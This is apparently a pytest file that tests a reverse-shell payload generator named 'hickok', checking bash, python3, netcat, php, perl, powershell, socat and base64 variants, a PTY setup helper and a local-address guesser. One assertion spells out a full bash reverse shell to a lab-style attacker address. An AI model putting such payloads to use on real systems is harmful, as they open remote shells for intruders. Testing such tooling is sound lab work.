from hickok import payloads


def test_generate_has_common_shells_with_lhost_lport():
    p = payloads.generate("10.10.14.7", 9001)
    assert {"bash", "python3", "nc-e", "php", "perl", "powershell"} <= set(p)
    assert "10.10.14.7" in p["bash"] and "9001" in p["bash"]
    assert "/dev/tcp/10.10.14.7/9001" in p["bash"]


def test_generate_has_socat_and_base64_variants():
    import base64

    p = payloads.generate("10.10.14.7", 9001)
    assert {"socat", "socat-pty", "bash-base64"} <= set(p)
    assert "10.10.14.7:9001" in p["socat"]
    enc = p["bash-base64"].split("echo ", 1)[1].split("|", 1)[0]
    assert base64.b64decode(enc).decode() == "bash -i >& /dev/tcp/10.10.14.7/9001 0>&1"


def test_pty_setup_carries_term_and_terminal_size():
    s = payloads.pty_setup(40, 120)
    assert "TERM=" in s and "rows 40" in s and "cols 120" in s


def test_guess_lhost_returns_an_address():
    host = payloads.guess_lhost()
    assert isinstance(host, str) and host.count(".") == 3
